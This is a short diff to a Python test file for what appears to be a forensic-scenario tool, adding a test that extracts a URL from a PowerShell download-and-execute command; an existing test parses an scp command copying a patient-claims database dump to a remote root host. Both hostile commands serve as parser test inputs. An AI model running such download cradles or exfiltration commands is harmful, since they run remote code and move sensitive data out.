@@ -10,6 +10,14 @@ from evidenceforge.models.scenario import System
 
 
 class TestStorylineCommandNetworks:
+    def test_extract_http_url_from_powershell_download(self):
+        url = StorylineMixin._extract_http_url(
+            'powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('
+            "'https://cdn.example.test/stage.ps1')\""
+        )
+
+        assert url == "https://cdn.example.test/stage.ps1"
+
     def test_extract_scp_target_from_remote_destination(self):
         target = StorylineMixin._extract_scp_target(
             "scp /tmp/patient_claims.sql.gz root@10.10.2.30:/var/tmp/",
